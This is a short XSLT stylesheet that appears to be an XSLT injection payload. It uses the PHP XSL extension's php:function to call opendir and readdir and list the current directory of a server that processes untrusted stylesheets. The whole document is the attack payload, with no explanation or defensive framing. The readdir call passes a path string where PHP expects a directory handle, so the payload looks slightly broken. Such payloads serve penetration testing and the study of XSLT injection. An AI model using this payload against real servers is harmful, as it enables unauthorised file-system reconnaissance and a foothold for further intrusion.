<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
       <xsl:value-of select="php:function('opendir','./')"/>
       <xsl:for-each select="php:function('readdir','./')">
       </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
